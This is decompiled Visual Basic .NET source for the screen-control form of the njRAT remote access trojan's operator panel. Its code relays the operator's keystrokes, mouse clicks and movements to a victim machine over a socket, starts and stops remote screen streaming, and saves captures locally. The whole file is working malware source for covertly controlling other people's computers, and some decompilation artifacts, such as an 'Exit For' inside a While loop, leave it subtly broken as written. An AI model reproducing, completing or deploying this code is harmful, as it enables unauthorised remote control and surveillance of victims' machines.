Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My.Resources

Namespace NJRAT
	' Token: 0x0200001E RID: 30
	<DesignerGenerated()>
	Public Partial Class sc
		Inherits Form

		' Token: 0x060004CC RID: 1228 RVA: 0x0002BD04 File Offset: 0x00029F04
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = sc.__ENCList
			SyncLock _ENCList
				If sc.__ENCList.Count = sc.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = sc.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = sc.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								sc.__ENCList(num) = sc.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					sc.__ENCList.RemoveRange(num, sc.__ENCList.Count - num)
					sc.__ENCList.Capacity = sc.__ENCList.Count
				End If
				sc.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170001BD RID: 445
		' (get) Token: 0x060004CF RID: 1231 RVA: 0x0002CD30 File Offset: 0x0002AF30
		' (set) Token: 0x060004D0 RID: 1232 RVA: 0x0002CD48 File Offset: 0x0002AF48
		Friend Overridable Property vmethod_16 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_16
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_16_Tick
				If Me._vmethod_16 IsNot Nothing Then
					RemoveHandler Me._vmethod_16.Tick, value2
				End If
				Me._vmethod_16 = value
				If Me._vmethod_16 IsNot Nothing Then
					AddHandler Me._vmethod_16.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170001BE RID: 446
		' (get) Token: 0x060004D1 RID: 1233 RVA: 0x0002CDA0 File Offset: 0x0002AFA0
		' (set) Token: 0x060004D2 RID: 1234 RVA: 0x0002CDB8 File Offset: 0x0002AFB8
		Friend Overridable Property vmethod_12 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_12
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_12_Tick
				If Me._vmethod_12 IsNot Nothing Then
					RemoveHandler Me._vmethod_12.Tick, value2
				End If
				Me._vmethod_12 = value
				If Me._vmethod_12 IsNot Nothing Then
					AddHandler Me._vmethod_12.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170001BF RID: 447
		' (get) Token: 0x060004D3 RID: 1235 RVA: 0x0002CE10 File Offset: 0x0002B010
		' (set) Token: 0x060004D4 RID: 1236 RVA: 0x00002EAD File Offset: 0x000010AD
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x170001C0 RID: 448
		' (get) Token: 0x060004D5 RID: 1237 RVA: 0x0002CE28 File Offset: 0x0002B028
		' (set) Token: 0x060004D6 RID: 1238 RVA: 0x0002CE40 File Offset: 0x0002B040
		Friend Overridable Property p As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._p
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As EventHandler = AddressOf Me.p_MouseEnter
				Dim value3 As MouseEventHandler = AddressOf Me.p_MouseDown
				Dim value4 As EventHandler = AddressOf Me.p_Resize
				Dim value5 As PaintEventHandler = AddressOf Me.p_Paint
				Dim value6 As MouseEventHandler = AddressOf Me.p_MouseWheel
				Dim value7 As MouseEventHandler = AddressOf Me.p_MouseUp
				Dim value8 As MouseEventHandler = AddressOf Me.p_MouseMove
				Dim value9 As EventHandler = AddressOf Me.p_MouseLeave
				If Me._p IsNot Nothing Then
					RemoveHandler Me._p.MouseEnter, value2
					RemoveHandler Me._p.MouseDown, value3
					RemoveHandler Me._p.Resize, value4
					RemoveHandler Me._p.Paint, value5
					RemoveHandler Me._p.MouseWheel, value6
					RemoveHandler Me._p.MouseUp, value7
					RemoveHandler Me._p.MouseMove, value8
					RemoveHandler Me._p.MouseLeave, value9
				End If
				Me._p = value
				If Me._p IsNot Nothing Then
					AddHandler Me._p.MouseEnter, value2
					AddHandler Me._p.MouseDown, value3
					AddHandler Me._p.Resize, value4
					AddHandler Me._p.Paint, value5
					AddHandler Me._p.MouseWheel, value6
					AddHandler Me._p.MouseUp, value7
					AddHandler Me._p.MouseMove, value8
					AddHandler Me._p.MouseLeave, value9
				End If
			End Set
		End Property

		' Token: 0x170001C1 RID: 449
		' (get) Token: 0x060004D7 RID: 1239 RVA: 0x0002CFAC File Offset: 0x0002B1AC
		' (set) Token: 0x060004D8 RID: 1240 RVA: 0x00002EB6 File Offset: 0x000010B6
		Friend Overridable Property Panel1 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel1 = value
			End Set
		End Property

		' Token: 0x170001C2 RID: 450
		' (get) Token: 0x060004D9 RID: 1241 RVA: 0x0002CFC4 File Offset: 0x0002B1C4
		' (set) Token: 0x060004DA RID: 1242 RVA: 0x0002CFDC File Offset: 0x0002B1DC
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001C3 RID: 451
		' (get) Token: 0x060004DB RID: 1243 RVA: 0x0002D034 File Offset: 0x0002B234
		' (set) Token: 0x060004DC RID: 1244 RVA: 0x00002EBF File Offset: 0x000010BF
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x170001C4 RID: 452
		' (get) Token: 0x060004DD RID: 1245 RVA: 0x0002D04C File Offset: 0x0002B24C
		' (set) Token: 0x060004DE RID: 1246 RVA: 0x00002EC8 File Offset: 0x000010C8
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x170001C5 RID: 453
		' (get) Token: 0x060004DF RID: 1247 RVA: 0x0002D064 File Offset: 0x0002B264
		' (set) Token: 0x060004E0 RID: 1248 RVA: 0x0002D07C File Offset: 0x0002B27C
		Friend Overridable Property CheckBox1 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox1_CheckedChanged
				If Me._CheckBox1 IsNot Nothing Then
					RemoveHandler Me._CheckBox1.CheckedChanged, value2
				End If
				Me._CheckBox1 = value
				If Me._CheckBox1 IsNot Nothing Then
					AddHandler Me._CheckBox1.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170001C6 RID: 454
		' (get) Token: 0x060004E1 RID: 1249 RVA: 0x0002D0D4 File Offset: 0x0002B2D4
		' (set) Token: 0x060004E2 RID: 1250 RVA: 0x0002D0EC File Offset: 0x0002B2EC
		Friend Overridable Property CheckBox2 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox2_CheckedChanged
				If Me._CheckBox2 IsNot Nothing Then
					RemoveHandler Me._CheckBox2.CheckedChanged, value2
				End If
				Me._CheckBox2 = value
				If Me._CheckBox2 IsNot Nothing Then
					AddHandler Me._CheckBox2.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170001C7 RID: 455
		' (get) Token: 0x060004E3 RID: 1251 RVA: 0x0002D144 File Offset: 0x0002B344
		' (set) Token: 0x060004E4 RID: 1252 RVA: 0x0002D15C File Offset: 0x0002B35C
		Friend Overridable Property CheckBox3 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox3_CheckedChanged
				If Me._CheckBox3 IsNot Nothing Then
					RemoveHandler Me._CheckBox3.CheckedChanged, value2
				End If
				Me._CheckBox3 = value
				If Me._CheckBox3 IsNot Nothing Then
					AddHandler Me._CheckBox3.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170001C8 RID: 456
		' (get) Token: 0x060004E5 RID: 1253 RVA: 0x0002D1B4 File Offset: 0x0002B3B4
		' (set) Token: 0x060004E6 RID: 1254 RVA: 0x00002ED1 File Offset: 0x000010D1
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Me._FormSkin1 = value
			End Set
		End Property

		' Token: 0x170001C9 RID: 457
		' (get) Token: 0x060004E7 RID: 1255 RVA: 0x0002D1CC File Offset: 0x0002B3CC
		' (set) Token: 0x060004E8 RID: 1256 RVA: 0x00002EDA File Offset: 0x000010DA
		Friend Overridable Property Button2 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Me._Button2 = value
			End Set
		End Property

		' Token: 0x170001CA RID: 458
		' (get) Token: 0x060004E9 RID: 1257 RVA: 0x0002D1E4 File Offset: 0x0002B3E4
		' (set) Token: 0x060004EA RID: 1258 RVA: 0x0002D1FC File Offset: 0x0002B3FC
		Friend Overridable Property FlatButton2 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton2_Click
				If Me._FlatButton2 IsNot Nothing Then
					RemoveHandler Me._FlatButton2.Click, value2
				End If
				Me._FlatButton2 = value
				If Me._FlatButton2 IsNot Nothing Then
					AddHandler Me._FlatButton2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001CB RID: 459
		' (get) Token: 0x060004EB RID: 1259 RVA: 0x0002D254 File Offset: 0x0002B454
		' (set) Token: 0x060004EC RID: 1260 RVA: 0x00002EE3 File Offset: 0x000010E3
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox1 = value
			End Set
		End Property

		' Token: 0x170001CC RID: 460
		' (get) Token: 0x060004ED RID: 1261 RVA: 0x0002D26C File Offset: 0x0002B46C
		' (set) Token: 0x060004EE RID: 1262 RVA: 0x00002EEC File Offset: 0x000010EC
		Friend Overridable Property UserImage1 As UserImage
			<DebuggerNonUserCode()>
			Get
				Return Me._UserImage1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UserImage)
				Me._UserImage1 = value
			End Set
		End Property

		' Token: 0x170001CD RID: 461
		' (get) Token: 0x060004EF RID: 1263 RVA: 0x0002D284 File Offset: 0x0002B484
		' (set) Token: 0x060004F0 RID: 1264 RVA: 0x00002EF5 File Offset: 0x000010F5
		Friend Overridable Property FlatMini1 As FlatMini
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatMini1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatMini)
				Me._FlatMini1 = value
			End Set
		End Property

		' Token: 0x060004F1 RID: 1265 RVA: 0x0002D29C File Offset: 0x0002B49C
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.sc_FormClosing
			AddHandler MyBase.Load, AddressOf Me.sc_Load
			AddHandler MyBase.ResizeBegin, AddressOf Me.sc_ResizeBegin
			AddHandler MyBase.ResizeEnd, AddressOf Me.sc_ResizeEnd
			sc.__ENCAddToList(Me)
			Me.QQ = String.Empty
			Me.Oimg = Nothing
			Me.point_0 = Nothing
			Me.point_1 = Nothing
			Me.co = 0
			Me.Folder = String.Empty
			Me.point_2 = New Point(30, 30)
			Me.IsActive = False
			Me.fps = 0
			Me.int_0 = 0
			Me.dbf = 0L
			Me.InitializeComponent()
		End Sub

		' Token: 0x060004F2 RID: 1266 RVA: 0x0002D378 File Offset: 0x0002B578
		Public Sub KDW(sender As Object, e As KeyEventArgs)
			If Operators.CompareString(Me.Button1.Text, "Start", False) <> 0 Then
				Me.p.Focus()
				If Me.CheckBox2.Checked Then
					Dim keyCode As Keys = e.KeyCode
					If keyCode <> Keys.Shift Then
						If keyCode <> Keys.ShiftKey Then
							If keyCode <> Keys.LShiftKey Then
								If keyCode <> Keys.RShiftKey Then
									Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(0), Class7.string_1, Conversions.ToString(CInt(e.KeyCode)) }))
									GoTo IL_F0
								End If
							End If
						End If
					End If
					Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(0), Class7.string_1, Conversions.ToString(16) }))
				End If
				IL_F0:
				e.SuppressKeyPress = True
			End If
		End Sub

		' Token: 0x060004F3 RID: 1267 RVA: 0x0002D47C File Offset: 0x0002B67C
		Public Sub KUP(sender As Object, e As KeyEventArgs)
			If Operators.CompareString(Me.Button1.Text, "Start", False) <> 0 Then
				Me.p.Focus()
				If Me.CheckBox2.Checked Then
					Dim keyCode As Keys = e.KeyCode
					If keyCode <> Keys.Shift Then
						If keyCode <> Keys.ShiftKey Then
							If keyCode <> Keys.LShiftKey Then
								If keyCode <> Keys.RShiftKey Then
									Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(2), Class7.string_1, Conversions.ToString(CInt(e.KeyCode)) }))
									GoTo IL_F0
								End If
							End If
						End If
					End If
					Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(2), Class7.string_1, Conversions.ToString(16) }))
				End If
				IL_F0:
				e.SuppressKeyPress = True
			End If
		End Sub

		' Token: 0x060004F4 RID: 1268 RVA: 0x0002D580 File Offset: 0x0002B780
		Private Sub p_MouseDown(sender As Object, e As MouseEventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
				If Me.CheckBox1.Checked Then
					If Operators.CompareString(Me.Button1.Text, "Start", False) <> 0 Then
						Dim point As Point = New Point(CInt(Math.Round(Math.Round(CDbl(e.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(e.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
						Dim value As Integer
						If e.Button = MouseButtons.Left Then
							value = 2
						End If
						If e.Button = MouseButtons.Right Then
							value = 8
						End If
						Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(point.X), Class7.string_1, Conversions.ToString(point.Y), Class7.string_1, Conversions.ToString(value) }))
					End If
				End If
			End SyncLock
		End Sub

		' Token: 0x060004F5 RID: 1269 RVA: 0x00002EFE File Offset: 0x000010FE
		Private Sub p_MouseEnter(sender As Object, e As EventArgs)
			Me.IsActive = True
		End Sub

		' Token: 0x060004F6 RID: 1270 RVA: 0x00002F07 File Offset: 0x00001107
		Private Sub p_MouseLeave(sender As Object, e As EventArgs)
			Me.IsActive = False
		End Sub

		' Token: 0x060004F7 RID: 1271 RVA: 0x0002D6DC File Offset: 0x0002B8DC
		Private Sub p_MouseMove(sender As Object, e As MouseEventArgs)
			Me.point_2 = e.Location
			If Me.point_2.Y < 20 Then
				Me.Button2.Visible = True
			Else
				Me.Button2.Visible = False
			End If
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
				If(Not Me.p.Focused And Me.CheckBox2.Checked) Or Me.CheckBox1.Checked Then
					Me.p.Focus()
				End If
			End SyncLock
		End Sub

		' Token: 0x060004F8 RID: 1272 RVA: 0x0002D77C File Offset: 0x0002B97C
		Private Sub p_MouseUp(sender As Object, e As MouseEventArgs)
			If Me.CheckBox1.Checked Then
				If Operators.CompareString(Me.Button1.Text, "Start", False) <> 0 Then
					Dim point As Point = New Point(CInt(Math.Round(Math.Round(CDbl(e.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(e.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
					Dim value As Integer
					If e.Button = MouseButtons.Left Then
						value = 4
					End If
					If e.Button = MouseButtons.Right Then
						value = 16
					End If
					Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(point.X), Class7.string_1, Conversions.ToString(point.Y), Class7.string_1, Conversions.ToString(value) }))
				End If
			End If
		End Sub

		' Token: 0x060004F9 RID: 1273 RVA: 0x0002D89C File Offset: 0x0002BA9C
		Private Sub p_MouseWheel(sender As Object, e As MouseEventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
				If Me.CheckBox1.Checked Then
					If Operators.CompareString(Me.Button1.Text, "Start", False) <> 0 Then
						Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(e.Delta), Class7.string_1, Conversions.ToString(Me.point_1.Y), Class7.string_1, Conversions.ToString(2048) }))
					End If
				End If
			End SyncLock
		End Sub

		' Token: 0x060004FA RID: 1274 RVA: 0x0002D964 File Offset: 0x0002BB64
		Private Sub p_Paint(sender As Object, e As PaintEventArgs)
			Dim text As String = Conversions.ToString(Me.int_0) + "fps" & vbCrLf + Class6.smethod_17(Me.pkt)
			Dim size As Size = TextRenderer.MeasureText(text, New Font(Me.Font, FontStyle.Bold))
			If Not(Me.point_2.X < size.Width And Me.point_2.Y < size.Height) Then
				Dim rect As Rectangle = New Rectangle(0, 0, size.Width, size.Height)
				e.Graphics.FillRectangle(New Pen(Color.FromArgb(100, 1, 1, 1)).Brush, rect)
				Dim brush As Brush = Brushes.Red
				If Me.int_0 > 3 Then
					brush = Brushes.YellowGreen
				End If
				If Me.int_0 > 6 Then
					brush = Brushes.LimeGreen
				End If
				e.Graphics.DrawString(text, New Font(Me.Font, FontStyle.Bold), brush, 0F, 0F)
			End If
		End Sub

		' Token: 0x060004FB RID: 1275 RVA: 0x0002DA58 File Offset: 0x0002BC58
		Private Sub p_Resize(sender As Object, e As EventArgs)
			Me.Button2.Left = CInt(Math.Round(Math.Round(CDbl(Me.p.Width) / 2.0 - CDbl(Me.Button2.Width) / 2.0)))
			Me.Button2.Top = Me.p.Top + 3
		End Sub

		' Token: 0x060004FC RID: 1276 RVA: 0x0002DAC4 File Offset: 0x0002BCC4
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.Button1.Text, "Stop", False) = 0 Then
				Me.Button1.Text = "Start"
				Me.sk.Send("!!")
				Me.ComboBox1.Enabled = True
			Else
				Me.ComboBox1.Enabled = False
				Me.Button1.Text = "Stop"
				Dim num As Single = CSng((Conversions.ToDouble(Me.ComboBox1.Text.Remove(0, 1)) / 100.0))
				Dim size As Size = New Size(CInt(Math.Round(Math.Round(CDbl((CSng(Me.sz.Width) * num / 10F))))) * 10, CInt(Math.Round(Math.Round(CDbl((CSng(Me.sz.Height) * num / 10F))))) * 10)
				Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Me.sk.ip(), Class7.string_1, Conversions.ToString(size.Width), "x", Conversions.ToString(size.Height), Class7.string_1, "0" }))
			End If
		End Sub

		' Token: 0x060004FD RID: 1277 RVA: 0x0002DC20 File Offset: 0x0002BE20
		Private Sub vmethod_16_Tick(sender As Object, e As EventArgs)
			Me.vmethod_12.Enabled = False
			If Not Me.osk.CN Or Not Me.sk.CN Then
				Me.sk.CN = False
				Me.Panel1.Enabled = False
				Me.Text = "Disconnected!! " + Me.QQ
				Me.Close()
			Else
				Me.int_0 = Me.fps
				Me.fps = 0
				If Me.int_0 = 0 Then
					Me.pkt = 0L
					Me.p.Invalidate()
				End If
				Me.vmethod_12.Enabled = True
			End If
		End Sub

		' Token: 0x060004FE RID: 1278 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060004FF RID: 1279 RVA: 0x0002DCD4 File Offset: 0x0002BED4
		Private Sub vmethod_12_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar1.Value = Me.sk.rp()
			Dim point As Point = Me.PointToClient(Cursor.Position)
			If point.X > -1 And point.Y > -1 And Me.IsActive Then
				Me.point_0 = New Point(CInt(Math.Round(Math.Round(CDbl(point.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(point.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
				If(Me.CheckBox1.Checked And Operators.CompareString(Me.Button1.Text, "Start", False) <> 0) AndAlso Me.point_0 <> Me.point_1 Then
					Me.point_1 = Me.point_0
					Dim client As Client = Me.sk
					Dim text As String = String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(Me.point_1.X), Class7.string_1, Conversions.ToString(Me.point_1.Y), Class7.string_1, Conversions.ToString(1) })
					client.SEND_(Class6.smethod_11(text))
				End If
			End If
		End Sub

		' Token: 0x06000500 RID: 1280 RVA: 0x0002DE48 File Offset: 0x0002C048
		Private Sub sc_FormClosing(sender As Object, e As FormClosingEventArgs)
			If Me.sk IsNot Nothing Then
				Me.sk.CN = False
			End If
		End Sub

		' Token: 0x06000501 RID: 1281 RVA: 0x0002DE70 File Offset: 0x0002C070
		Private Sub sc_Load(sender As Object, e As EventArgs)
			Try
				Dim p As PictureBox = Me.p
				Dim obj As PictureBox = p
				SyncLock obj
					Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
					Me.Text = Me.QQ
					Dim p2 As Control = Me.p
					AddHandler p2.KeyUp, AddressOf Me.KUP
					AddHandler p2.KeyDown, AddressOf Me.KDW
					Me.ComboBox1.SelectedIndex = Conversions.ToInteger(Class7.class8_0.string_0)
				End SyncLock
				Me.Folder = Me.osk.Folder + "Screen\"
				If Not Directory.Exists(Me.Folder) Then
					Directory.CreateDirectory(Me.Folder)
				End If
				If Class7.class8_0.bool_6 Then
					Me.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e)
				End If
				If Operators.CompareString(Me.Button1.Text, "Start", False) <> 0 Then
					Me.Button2_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e)
				End If
			Catch ex As Exception
				Me.Close()
			End Try
		End Sub

		' Token: 0x06000502 RID: 1282 RVA: 0x0002DFE4 File Offset: 0x0002C1E4
		Private Sub sc_ResizeBegin(sender As Object, e As EventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
			End SyncLock
		End Sub

		' Token: 0x06000503 RID: 1283 RVA: 0x0002DFE4 File Offset: 0x0002C1E4
		Private Sub sc_ResizeEnd(sender As Object, e As EventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
			End SyncLock
		End Sub

		' Token: 0x06000504 RID: 1284 RVA: 0x0002E01C File Offset: 0x0002C21C
		Private Sub Button2_Click(sender As Object, e As EventArgs)
			If Not Me.Panel1.Visible Then
				Me.Panel1.Visible = True
				Me.Button2.BackgroundImage = Resources.bullet_arrow_up
			Else
				Me.Panel1.Visible = False
				Me.Button2.BackgroundImage = Resources.bullet_arrow_down
			End If
		End Sub

		' Token: 0x06000505 RID: 1285 RVA: 0x0002E074 File Offset: 0x0002C274
		Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs)
			If Me.CheckBox3.Checked Then
				Try
					Process.Start(Me.Folder)
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000506 RID: 1286 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000507 RID: 1287 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub CheckBox3_CheckedChanged_1(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000508 RID: 1288 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub CheckBox1_CheckedChanged_1(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000509 RID: 1289 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub Button1_Click_1(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x0600050A RID: 1290 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub FlatButton2_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x04000231 RID: 561
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000233 RID: 563
		<AccessedThroughProperty("vmethod_16")>
		Private _vmethod_16 As Timer

		' Token: 0x04000234 RID: 564
		<AccessedThroughProperty("vmethod_12")>
		Private _vmethod_12 As Timer

		' Token: 0x04000235 RID: 565
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x04000236 RID: 566
		<AccessedThroughProperty("p")>
		Private _p As PictureBox

		' Token: 0x04000237 RID: 567
		<AccessedThroughProperty("Panel1")>
		Private _Panel1 As Panel

		' Token: 0x04000238 RID: 568
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000239 RID: 569
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x0400023A RID: 570
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x0400023B RID: 571
		<AccessedThroughProperty("CheckBox1")>
		Private _CheckBox1 As CheckBox

		' Token: 0x0400023C RID: 572
		<AccessedThroughProperty("CheckBox2")>
		Private _CheckBox2 As CheckBox

		' Token: 0x0400023D RID: 573
		<AccessedThroughProperty("CheckBox3")>
		Private _CheckBox3 As CheckBox

		' Token: 0x0400023E RID: 574
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x0400023F RID: 575
		<AccessedThroughProperty("Button2")>
		Private _Button2 As Button

		' Token: 0x04000240 RID: 576
		<AccessedThroughProperty("FlatButton2")>
		Private _FlatButton2 As FlatButton

		' Token: 0x04000241 RID: 577
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox

		' Token: 0x04000242 RID: 578
		<AccessedThroughProperty("UserImage1")>
		Private _UserImage1 As UserImage

		' Token: 0x04000243 RID: 579
		<AccessedThroughProperty("FlatMini1")>
		Private _FlatMini1 As FlatMini

		' Token: 0x04000244 RID: 580
		Public co As Integer

		' Token: 0x04000245 RID: 581
		Public dbf As Long

		' Token: 0x04000246 RID: 582
		Public Folder As String

		' Token: 0x04000247 RID: 583
		Public fps As Integer

		' Token: 0x04000248 RID: 584
		Private int_0 As Integer

		' Token: 0x04000249 RID: 585
		Public IsActive As Boolean

		' Token: 0x0400024A RID: 586
		Public Oimg As Bitmap

		' Token: 0x0400024B RID: 587
		Public osk As Client

		' Token: 0x0400024C RID: 588
		Public pkt As Long

		' Token: 0x0400024D RID: 589
		Private point_0 As Point

		' Token: 0x0400024E RID: 590
		Private point_1 As Point

		' Token: 0x0400024F RID: 591
		Private point_2 As Point

		' Token: 0x04000250 RID: 592
		Public QQ As String

		' Token: 0x04000251 RID: 593
		Public sk As Client

		' Token: 0x04000252 RID: 594
		Public sz As Size
	End Class
End Namespace
